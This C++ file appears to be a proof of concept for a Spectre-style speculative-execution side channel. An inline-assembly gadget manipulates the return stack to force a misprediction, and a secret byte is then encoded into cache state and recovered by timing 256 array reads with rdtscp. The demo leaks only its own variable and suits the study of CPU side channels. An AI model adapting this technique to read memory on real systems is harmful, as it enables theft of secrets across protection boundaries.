#include <stdio.h>
#include <stdlib.h>
#include <cstdlib>
#include <inttypes.h>
#include <time.h>
#include <iostream>
#include <x86intrin.h>
#include "util.hpp"

using namespace std;

char array[256*256];
char temp;
char secret = 'p';

void gadget(){
	__asm__(
	"pop %rdi;"
	"pop %rdi;"	
	"pop %rdi;"
	"nop;"
	"pop %rbp;"
	"clflush (%rsp);"
	"cpuid;"
	"retq;");
}


void speculative(char *secret_ptr){
	gadget();
	secret = *secret_ptr;
	temp &= array[secret * 256];
}

int addFive(int x){
	return x+5;
}

int main(){
	int x = 2;
	int y = addFive(x);
	speculative(&secret);
	unsigned int dummy;
	for(int i=0; i<256; i++){
		auto t1 = __rdtscp(&dummy);
		auto junk = array[i*256];
		auto t2 = __rdtscp(&dummy);
		cout<< i <<" "<<t2-t1<<endl;
	}
	return 0;
}
